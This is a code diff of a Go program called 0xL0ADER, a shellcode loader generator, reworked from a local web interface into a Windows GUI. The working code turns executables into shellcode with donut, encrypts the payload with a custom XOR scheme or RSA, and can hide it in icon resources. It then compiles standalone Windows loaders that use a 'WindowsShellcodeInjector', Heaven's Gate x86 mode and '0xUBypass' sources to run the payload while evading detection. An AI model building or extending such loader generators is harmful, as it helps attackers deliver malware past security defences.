@@ -2,228 +2,264 @@ package main
 
 import (
 	"crypto/sha256"
-	_ "embed"
-	"encoding/base64"
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
-	"io"
 	"log"
-	"net"
-	"net/http"
 	"os"
 	"os/exec"
-	"os/signal"
 	"path/filepath"
-	"runtime"
 	"strings"
+	"time"
+
+	"github.com/lxn/walk"
+	. "github.com/lxn/walk/declarative"
 )
 
-//go:embed ui.html
-var uiHTML []byte
+type App struct {
+	mw         *walk.MainWindow
+	filePath   *walk.LineEdit
+	encryption *walk.ComboBox
+	mode       *walk.ComboBox
+	embedKey   *walk.CheckBox
+	genBtn     *walk.PushButton
+	logBox     *walk.TextEdit
+}
 
 func main() {
-	port := "0"
-	if p := os.Getenv("PORT"); p != "" {
-		port = p
-	}
+	app := &App{}
 
-	http.HandleFunc("/", serveUI)
-	http.HandleFunc("/api/generate", handleGenerate)
-	http.HandleFunc("/api/status", handleStatus)
-
-	ln, err := net.Listen("tcp", "127.0.0.1:"+port)
-	if err != nil {
-		log.Fatalf("Failed to bind: %v", err)
-	}
-	addr := ln.Addr().(*net.TCPAddr)
-	url := fmt.Sprintf("http://127.0.0.1:%d", addr.Port)
-
-	log.Printf("0xL0ADER — Shellcode Loader Generator")
-	log.Printf("Listening on %s", url)
-
-	openAppWindow(url)
-
-	go func() {
-		c := make(chan os.Signal, 1)
-		signal.Notify(c, os.Interrupt)
-		<-c
-		log.Println("Shutting down...")
-		os.Exit(0)
-	}()
-
-	log.Fatal(http.Serve(ln, nil))
-}
-
-func openAppWindow(url string) {
-	if runtime.GOOS != "windows" {
-		return
-	}
-	browsers := []struct {
-		path string
-		args []string
-	}{
-		{filepath.Join(os.Getenv("ProgramFiles(x86)"), "Microsoft", "Edge", "Application", "msedge.exe"),
-			[]string{"--app=" + url, "--window-size=800,700"}},
-		{filepath.Join(os.Getenv("ProgramFiles"), "Microsoft", "Edge", "Application", "msedge.exe"),
-			[]string{"--app=" + url, "--window-size=800,700"}},
-		{filepath.Join(os.Getenv("ProgramFiles"), "Google", "Chrome", "Application", "chrome.exe"),
-			[]string{"--app=" + url, "--window-size=800,700"}},
-		{filepath.Join(os.Getenv("ProgramFiles(x86)"), "Google", "Chrome", "Application", "chrome.exe"),
-			[]string{"--app=" + url, "--window-size=800,700"}},
-	}
-	for _, b := range browsers {
-		if _, err := os.Stat(b.path); err == nil {
-			exec.Command(b.path, b.args...).Start()
-			return
-		}
-	}
-	exec.Command("cmd", "/c", "start", url).Start()
-}
-
-func serveUI(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	w.Write(uiHTML)
-}
-
-func handleStatus(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "application/json")
+	t := time.Now().Format("15:04:05")
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "[%s] 0xL0ADER\r\n", t)
 	gpp := findGpp()
 	donut := findDonutExe()
-	windres := ""
 	if gpp != "" {
-		windres = findWindres(gpp)
+		fmt.Fprintf(&sb, "[%s] g++: OK\r\n", t)
+		if wr := findWindres(gpp); wr != "" {
+			fmt.Fprintf(&sb, "[%s] windres: OK\r\n", t)
+		} else {
+			fmt.Fprintf(&sb, "[%s] windres: NOT FOUND\r\n", t)
+		}
+	} else {
+		fmt.Fprintf(&sb, "[%s] g++: NOT FOUND — run install.ps1\r\n", t)
 	}
-	missing := []string{}
-	if gpp == "" {
-		missing = append(missing, "g++ (MinGW)")
+	if donut != "" {
+		fmt.Fprintf(&sb, "[%s] donut: OK\r\n", t)
+	} else {
+		fmt.Fprintf(&sb, "[%s] donut: NOT FOUND — run install.ps1\r\n", t)
 	}
-	if donut == "" {
-		missing = append(missing, "donut.exe")
+
+	if _, err := (MainWindow{
+		AssignTo: &app.mw,
+		Title:    "0xL0ADER",
+		MinSize:  Size{Width: 640, Height: 520},
+		Size:     Size{Width: 640, Height: 520},
+		Layout:   VBox{Margins: Margins{Left: 10, Top: 10, Right: 10, Bottom: 10}, Spacing: 8},
+		Children: []Widget{
+			Composite{
+				Layout: HBox{MarginsZero: true, Spacing: 6},
+				Children: []Widget{
+					LineEdit{
+						AssignTo:  &app.filePath,
+						ReadOnly:  true,
+						CueBanner: "Select PE (.exe) or shellcode (.bin/.raw)...",
+					},
+					PushButton{
+						Text:      "Browse",
+						MaxSize:   Size{Width: 80, Height: 0},
+						OnClicked: app.browseFile,
+					},
+				},
+			},
+			GroupBox{
+				Title:  "Options",
+				Layout: HBox{Spacing: 10},
+				Children: []Widget{
+					Label{Text: "Encryption:"},
+					ComboBox{
+						AssignTo:     &app.encryption,
+						Model:        []string{"ECL", "RSA"},
+						CurrentIndex: 0,
+						MaxSize:      Size{Width: 80, Height: 0},
+					},
+					Label{Text: "Mode:"},
+					ComboBox{
+						AssignTo:     &app.mode,
+						Model:        []string{"Callback", "x64", "x86"},
+						CurrentIndex: 0,
+						MaxSize:      Size{Width: 100, Height: 0},
+					},
+					HSpacer{},
+					CheckBox{
+						AssignTo: &app.embedKey,
+						Text:     "Embed Key",
+						Checked:  true,
+					},
+				},
+			},
+			PushButton{
+				AssignTo:  &app.genBtn,
+				Text:      "Generate Loader",
+				MinSize:   Size{Width: 0, Height: 32},
+				OnClicked: app.generate,
+			},
+			TextEdit{
+				AssignTo: &app.logBox,
+				ReadOnly: true,
+				VScroll:  true,
+				Text:     sb.String(),
+				Font:     Font{Family: "Consolas", PointSize: 9},
+			},
+		},
+	}).Run(); err != nil {
+		log.Fatal(err)
 	}
-	if windres == "" {
-		missing = append(missing, "windres")
+}
+
+func (app *App) browseFile() {
+	dlg := new(walk.FileDialog)
+	dlg.Title = "Select PE or Shellcode"
+	dlg.Filter = "Executables/Shellcode (*.exe;*.bin;*.raw)|*.exe;*.bin;*.raw|All Files (*.*)|*.*"
+	if ok, err := dlg.ShowOpen(app.mw); err == nil && ok {
+		app.filePath.SetText(dlg.FilePath)
 	}
-	json.NewEncoder(w).Encode(map[string]interface{}{
-		"ready":   gpp != "",
-		"gpp":     gpp != "",
-		"donut":   donut != "",
-		"windres": windres != "",
-		"missing": missing,
+}
+
+func (app *App) logMsg(msg string) {
+	app.mw.Synchronize(func() {
+		t := time.Now().Format("15:04:05")
+		app.logBox.AppendText(fmt.Sprintf("[%s] %s\r\n", t, msg))
 	})
 }
 
-func handleGenerate(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Access-Control-Allow-Origin", "*")
-	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
-	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
-	if r.Method == http.MethodOptions {
+func (app *App) generate() {
+	inputPath := app.filePath.Text()
+	if inputPath == "" {
+		walk.MsgBox(app.mw, "Error", "Please select a file first.", walk.MsgBoxIconError)
 		return
 	}
-	if r.Method != http.MethodPost {
-		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
-	if err := r.ParseMultipartForm(32 << 20); err != nil {
-		jsonError(w, "failed to parse form: "+err.Error(), http.StatusBadRequest)
-		return
-	}
-	file, _, err := r.FormFile("file")
-	if err != nil {
-		jsonError(w, "no file uploaded", http.StatusBadRequest)
-		return
-	}
-	defer file.Close()
 
-	mode := r.FormValue("mode")
-	if mode == "" {
-		mode = "x64"
-	}
-	embedKey := r.FormValue("embed_key") == "true"
-	encryption := r.FormValue("encryption")
-	if encryption == "" {
+	encIdx := app.encryption.CurrentIndex()
+	modeIdx := app.mode.CurrentIndex()
+	embed := app.embedKey.Checked()
+
+	encryption := "ecl"
+	if encIdx == 1 {
 		encryption = "rsa"
 	}
+	mode := "callback"
+	if modeIdx == 1 {
+		mode = "x64"
+	} else if modeIdx == 2 {
+		mode = "x86"
+	}
 
-	inputData, err := io.ReadAll(file)
+	app.genBtn.SetEnabled(false)
+	app.logBox.SetText("")
+
+	go func() {
+		defer app.mw.Synchronize(func() {
+			app.genBtn.SetEnabled(true)
+		})
+
+		outputData, privateKey, err := app.buildLoader(inputPath, mode, encryption, embed)
+		if err != nil {
+			app.logMsg("BUILD FAILED: " + err.Error())
+			app.mw.Synchronize(func() {
+				walk.MsgBox(app.mw, "Build Failed", err.Error(), walk.MsgBoxIconError)
+			})
+			return
+		}
+
+		app.mw.Synchronize(func() {
+			base := filepath.Base(inputPath)
+			ext := filepath.Ext(base)
+			saveName := fmt.Sprintf("0xL0ADER_%s_%s_%s.exe", encryption, mode, strings.TrimSuffix(base, ext))
+
+			dlg := new(walk.FileDialog)
+			dlg.Title = "Save Loader"
+			dlg.Filter = "Executable (*.exe)|*.exe"
+			dlg.FilePath = saveName
+
+			if ok, saveErr := dlg.ShowSave(app.mw); saveErr == nil && ok {
+				if wErr := os.WriteFile(dlg.FilePath, outputData, 0755); wErr != nil {
+					walk.MsgBox(app.mw, "Error", "Failed to save: "+wErr.Error(), walk.MsgBoxIconError)
+					return
+				}
+				app.logMsg(fmt.Sprintf("Saved: %s (%d bytes)", dlg.FilePath, len(outputData)))
+				if !embed && privateKey != "" {
+					app.logMsg(fmt.Sprintf("Key: %s", privateKey))
+					app.logMsg(fmt.Sprintf("Run: %s '%s'", filepath.Base(dlg.FilePath), privateKey))
+				}
+			}
+		})
+	}()
+}
+
+func (app *App) buildLoader(inputPath, mode, encryption string, embedKey bool) ([]byte, string, error) {
+	inputData, err := os.ReadFile(inputPath)
 	if err != nil {
-		jsonError(w, "failed to read uploaded file", http.StatusInternalServerError)
-		return
+		return nil, "", fmt.Errorf("failed to read input: %w", err)
 	}
 
 	var gpp string
 	if mode == "x86" {
 		gpp = findGpp32()
 		if gpp == "" {
-			jsonError(w, "32-bit MinGW g++ (i686-w64-mingw32-g++) not found", http.StatusInternalServerError)
-			return
+			return nil, "", fmt.Errorf("32-bit MinGW g++ not found")
 		}
 	} else {
 		gpp = findGpp()
 		if gpp == "" {
-			jsonError(w, "MinGW g++ not found", http.StatusInternalServerError)
-			return
+			return nil, "", fmt.Errorf("MinGW g++ not found")
 		}
 	}
 
 	tmpDir, err := os.MkdirTemp("", "0xL0ADER-*")
 	if err != nil {
-		jsonError(w, "failed to create temp directory", http.StatusInternalServerError)
-		return
+		return nil, "", fmt.Errorf("failed to create temp dir: %w", err)
 	}
 	defer os.RemoveAll(tmpDir)
-
-	var buildLog []string
-	logStep := func(msg string) {
-		buildLog = append(buildLog, msg)
-		log.Printf("[0xL0ADER] %s", msg)
-	}
 
 	var shellcode []byte
 	isPE := len(inputData) >= 2 && inputData[0] == 'M' && inputData[1] == 'Z'
 	if isPE {
 		donutExe := findDonutExe()
 		if donutExe == "" {
-			jsonError(w, "donut.exe not found", http.StatusInternalServerError)
-			return
+			return nil, "", fmt.Errorf("donut.exe not found")
 		}
-		inputPath := filepath.Join(tmpDir, "input.exe")
-		if err := os.WriteFile(inputPath, inputData, 0644); err != nil {
-			jsonError(w, "failed to write input file", http.StatusInternalServerError)
-			return
+		inputPE := filepath.Join(tmpDir, "input.exe")
+		if err := os.WriteFile(inputPE, inputData, 0644); err != nil {
+			return nil, "", fmt.Errorf("failed to write input: %w", err)
 		}
-		logStep(fmt.Sprintf("Received PE file (%d bytes)", len(inputData)))
+		app.logMsg(fmt.Sprintf("PE file (%d bytes)", len(inputData)))
 		donutArch := "2"
 		if mode == "x86" {
 			donutArch = "1"
 		}
-		shellcodePath := filepath.Join(tmpDir, "shellcode.bin")
-		donutCmd := exec.Command(donutExe, "-i", inputPath, "-o", shellcodePath, "-a", donutArch, "-f", "1", "-b", "3", "-e", "1")
+		scPath := filepath.Join(tmpDir, "shellcode.bin")
+		donutCmd := exec.Command(donutExe, "-i", inputPE, "-o", scPath, "-a", donutArch, "-f", "1", "-b", "3", "-e", "1")
 		donutCmd.Dir = tmpDir
 		donutOut, err := donutCmd.CombinedOutput()
 		if err != nil {
-			logStep("Donut failed: " + string(donutOut))
-			jsonError(w, "donut conversion failed: "+err.Error(), http.StatusInternalServerError)
-			return
+			app.logMsg("Donut failed: " + string(donutOut))
+			return nil, "", fmt.Errorf("donut failed: %s", donutOut)
 		}
-		shellcode, err = os.ReadFile(shellcodePath)
+		shellcode, err = os.ReadFile(scPath)
 		if err != nil || len(shellcode) == 0 {
-			jsonError(w, "donut produced no output", http.StatusInternalServerError)
-			return
+			return nil, "", fmt.Errorf("donut produced no output")
 		}
-		logStep(fmt.Sprintf("Donut: %d bytes PE -> %d bytes shellcode (arch=%s)", len(inputData), len(shellcode), mode))
+		app.logMsg(fmt.Sprintf("Donut: %d -> %d bytes (arch=%s)", len(inputData), len(shellcode), mode))
 	} else {
 		shellcode = inputData
-		logStep(fmt.Sprintf("Received raw shellcode (%d bytes)", len(shellcode)))
+		app.logMsg(fmt.Sprintf("Raw shellcode (%d bytes)", len(shellcode)))
 	}
 
 	if len(shellcode) == 0 {
-		jsonError(w, "shellcode is empty", http.StatusBadRequest)
-		return
+		return nil, "", fmt.Errorf("shellcode is empty")
 	}
 	if len(shellcode) > 4*1024*1024 {
-		jsonError(w, fmt.Sprintf("shellcode too large (%d bytes, max 4MB)", len(shellcode)), http.StatusBadRequest)
-		return
+		return nil, "", fmt.Errorf("shellcode too large (%d bytes, max 4MB)", len(shellcode))
 	}
 
 	var (
@@ -241,27 +277,24 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 			privateKey = key
 			compressed, cErr := deflateCompress(shellcode)
 			if cErr != nil {
-				jsonError(w, "DEFLATE compression failed: "+cErr.Error(), http.StatusInternalServerError)
-				return
+				return nil, "", fmt.Errorf("DEFLATE failed: %w", cErr)
 			}
-			logStep(fmt.Sprintf("DEFLATE: %d bytes -> %d bytes (%.1f%%)", len(shellcode), len(compressed), float64(len(compressed))*100/float64(len(shellcode))))
-			logStep("Generating ECL key (SHA256-chain key stream)...")
+			app.logMsg(fmt.Sprintf("DEFLATE: %d -> %d bytes (%.1f%%)", len(shellcode), len(compressed), float64(len(compressed))*100/float64(len(shellcode))))
+			app.logMsg("ECL key generation (SHA256-chain)...")
 			encoded := eclEncodeDirect(compressed, key)
-			logStep(fmt.Sprintf("ECL direct: %d bytes -> %d bytes (XOR 1:1)", len(compressed), len(encoded)))
+			app.logMsg(fmt.Sprintf("ECL: %d -> %d bytes (XOR 1:1)", len(compressed), len(encoded)))
 			loaderCpp = oxuGenerateLoaderEclCallback(encoded, len(encoded), len(shellcode), key, embedKey)
 			callbackPayload = encoded
 		} else {
 			key := eclGenerateKey()
 			privateKey = key
-			logStep("Generating ECL key (SHA256-chain key stream)...")
+			app.logMsg("ECL key generation (SHA256-chain)...")
+			encodedData := eclEncode(shellcode, key)
+			app.logMsg(fmt.Sprintf("ECL: %d -> %d bytes (sub64 2:1)", len(shellcode), len(encodedData)))
 			if mode == "x86" {
-				encodedData := eclEncode(shellcode, key)
-				logStep(fmt.Sprintf("ECL encoded: %d bytes -> %d bytes (sub64 2:1)", len(shellcode), len(encodedData)))
 				loaderCpp = oxuGenerateLoaderEclX86(encodedData, len(encodedData), len(shellcode), key, embedKey)
 				srcFilesNeeded = []string{"WindowsShellcodeInjector.cpp", "WindowsShellcodeInjector.h"}
 			} else {
-				encodedData := eclEncode(shellcode, key)
-				logStep(fmt.Sprintf("ECL encoded: %d bytes -> %d bytes (sub64 2:1)", len(shellcode), len(encodedData)))
 				loaderCpp = oxuGenerateLoaderEclX64(encodedData, len(encodedData), len(shellcode), key, embedKey)
 			}
 		}
@@ -270,31 +303,31 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 			cppFiles = append(cppFiles, filepath.Join(tmpDir, "WindowsShellcodeInjector.cpp"))
 		}
 	} else {
-		logStep("Generating RSA keypair (64-bit primes)...")
+		app.logMsg("RSA keypair generation (64-bit primes)...")
 		_, privKey, e, _, n, err := oxuGenerateKeyPair()
 		if err != nil {
-			jsonError(w, "RSA keypair generation failed: "+err.Error(), http.StatusInternalServerError)
-			return
+			return nil, "", fmt.Errorf("RSA keypair failed: %w", err)
 		}
 		privateKey = privKey
-		logStep("RSA keypair generated successfully")
+		app.logMsg("RSA keypair OK")
 
 		paddedLen := len(shellcode)
 		if paddedLen%oxuBlockSize != 0 {
 			paddedLen = ((paddedLen / oxuBlockSize) + 1) * oxuBlockSize
 		}
 		encrypted := oxuEncryptShellcode(shellcode, e, n)
-		logStep(fmt.Sprintf("RSA encrypted: %d bytes -> %d bytes", len(shellcode), len(encrypted)))
+		app.logMsg(fmt.Sprintf("RSA: %d -> %d bytes", len(shellcode), len(encrypted)))
 
-		if mode == "x86" {
+		switch mode {
+		case "x86":
 			loaderCpp = oxuGenerateLoaderX86(encrypted, len(encrypted), paddedLen, privKey, embedKey)
 			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h",
 				"WindowsShellcodeInjector.cpp", "WindowsShellcodeInjector.h"}
-		} else if mode == "callback" {
+		case "callback":
 			loaderCpp = oxuGenerateLoaderRsaCallback(encrypted, len(encrypted), paddedLen, privKey, embedKey)
 			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
 			callbackPayload = encrypted
-		} else {
+		default:
 			loaderCpp = oxuGenerateLoaderX64(encrypted, len(encrypted), paddedLen, privKey, embedKey)
 			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
 		}
@@ -310,55 +343,48 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if err := os.WriteFile(filepath.Join(tmpDir, "main.cpp"), []byte(loaderCpp), 0644); err != nil {
-		jsonError(w, "failed to write main.cpp", http.StatusInternalServerError)
-		return
+		return nil, "", fmt.Errorf("write main.cpp: %w", err)
 	}
 
 	if len(srcFilesNeeded) > 0 {
 		srcDir := find0xUBypassDir()
 		if srcDir == "" {
-			jsonError(w, "0xUBypass source directory not found (needed for RSA/x86 mode)", http.StatusInternalServerError)
-			return
+			return nil, "", fmt.Errorf("0xUBypass source directory not found")
 		}
 		for _, f := range srcFilesNeeded {
 			data, err := os.ReadFile(filepath.Join(srcDir, f))
 			if err != nil {
-				jsonError(w, fmt.Sprintf("failed to read %s: %v", f, err), http.StatusInternalServerError)
-				return
+				return nil, "", fmt.Errorf("read %s: %w", f, err)
 			}
 			if err := os.WriteFile(filepath.Join(tmpDir, f), data, 0644); err != nil {
-				jsonError(w, fmt.Sprintf("failed to write %s: %v", f, err), http.StatusInternalServerError)
-				return
+				return nil, "", fmt.Errorf("write %s: %w", f, err)
 			}
 		}
 	}
-	logStep("Wrote loader source files")
+	app.logMsg("Source files ready")
 
 	if mode == "callback" && callbackPayload != nil {
 		sizes := pickIconTier(len(callbackPayload))
 		maxCap := iconPayloadCapForSizes(sizes) * len(iconGroupNames)
 		if len(callbackPayload) > maxCap {
-			jsonError(w, fmt.Sprintf("payload too large for icon storage (%d bytes, max %d bytes)", len(callbackPayload), maxCap), http.StatusBadRequest)
-			return
+			return nil, "", fmt.Errorf("payload too large for icons (%d/%d bytes)", len(callbackPayload), maxCap)
 		}
 		icoFiles := generatePayloadIcons(callbackPayload)
 		var rcLines strings.Builder
 		for i, ico := range icoFiles {
 			fname := iconGroupNames[i] + ".ico"
 			if err := os.WriteFile(filepath.Join(tmpDir, fname), ico, 0644); err != nil {
-				jsonError(w, "failed to write "+fname, http.StatusInternalServerError)
-				return
+				return nil, "", fmt.Errorf("write %s: %w", fname, err)
 			}
 			rcLines.WriteString(fmt.Sprintf("%d ICON \"%s\"\n", i+1, fname))
 		}
 		icoRCLines = rcLines.String()
-		logStep(fmt.Sprintf("Embedded %d bytes payload across %d icon group(s) (32bpp RGBA, sizes %v)", len(callbackPayload), len(icoFiles), sizes))
+		app.logMsg(fmt.Sprintf("Icons: %d bytes / %d group(s) (32bpp RGBA %v)", len(callbackPayload), len(icoFiles), sizes))
 	}
 
 	windres := findWindres(gpp)
 	if windres == "" && mode == "callback" && icoRCLines != "" {
-		jsonError(w, "windres not found; required for callback mode icon resources", http.StatusInternalServerError)
-		return
+		return nil, "", fmt.Errorf("windres not found (required for callback)")
 	}
 	if windres != "" {
 		manifestPath := filepath.Join(tmpDir, "app.manifest")
@@ -374,13 +400,12 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 			wrCmd.Dir = tmpDir
 			if wrOut, wrErr := wrCmd.CombinedOutput(); wrErr == nil {
 				cppFiles = append(cppFiles, resPath)
-				logStep("Added PE resources (.rsrc)")
+				app.logMsg("PE resources (.rsrc) added")
 			} else {
 				if mode == "callback" && icoRCLines != "" {
-					jsonError(w, "windres failed for icon resources: "+string(wrOut), http.StatusInternalServerError)
-					return
+					return nil, "", fmt.Errorf("windres failed: %s", wrOut)
 				}
-				logStep("windres skipped: " + string(wrOut))
+				app.logMsg("windres skipped: " + string(wrOut))
 			}
 		}
 	}
@@ -399,57 +424,36 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 		compileArgs = append(compileArgs, "-lole32", "-lmfplat")
 	}
 
+	app.logMsg("Compiling...")
 	compileCmd := exec.Command(gpp, compileArgs...)
 	compileCmd.Dir = tmpDir
 	compileOut, err := compileCmd.CombinedOutput()
 	if err != nil {
-		logStep("Compilation failed: " + string(compileOut))
-		jsonError(w, "compilation failed: "+string(compileOut), http.StatusInternalServerError)
-		return
+		app.logMsg("Compilation failed:\r\n" + string(compileOut))
+		return nil, "", fmt.Errorf("compilation failed:\n%s", compileOut)
 	}
 
-	encLabel := "RSA"
-	if encryption == "ecl" {
-		encLabel = "ECL"
-	}
-	archLabel := "x64"
-	if mode == "x86" {
-		archLabel = "x86 (Heaven's Gate)"
-	} else if mode == "callback" {
+	encLabel := strings.ToUpper(encryption)
+	archLabel := mode
+	if mode == "callback" {
 		archLabel = "x64 Callback"
+	} else if mode == "x86" {
+		archLabel = "x86 (Heaven's Gate)"
 	}
-	logStep(fmt.Sprintf("Compiled 0xL0ADER loader (%s, %s, static)", encLabel, archLabel))
+	app.logMsg(fmt.Sprintf("Compiled (%s, %s, static)", encLabel, archLabel))
 
 	outputData, err := os.ReadFile(outputExe)
 	if err != nil {
-		jsonError(w, "failed to read compiled output", http.StatusInternalServerError)
-		return
+		return nil, "", fmt.Errorf("read output: %w", err)
 	}
 	hash := sha256.Sum256(outputData)
-	logStep(fmt.Sprintf("Output: %d bytes, SHA256: %s", len(outputData), hex.EncodeToString(hash[:])))
+	app.logMsg(fmt.Sprintf("Output: %d bytes, SHA256: %s", len(outputData), hex.EncodeToString(hash[:])))
 
 	if embedKey {
-		logStep("Key embedded in binary, double-click to run")
-	} else {
-		logStep(fmt.Sprintf("Usage: 0xu_loader.exe '%s'", privateKey))
+		app.logMsg("Key embedded — double-click to run")
 	}
 
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]interface{}{
-		"data":        base64.StdEncoding.EncodeToString(outputData),
-		"hash":        hex.EncodeToString(hash[:]),
-		"private_key": privateKey,
-		"build_log":   buildLog,
-		"mode":        mode,
-		"embed_key":   embedKey,
-		"encryption":  encryption,
-	})
-}
-
-func jsonError(w http.ResponseWriter, message string, code int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(code)
-	json.NewEncoder(w).Encode(map[string]string{"error": message})
+	return outputData, privateKey, nil
 }
 
 func findDonutExe() string {
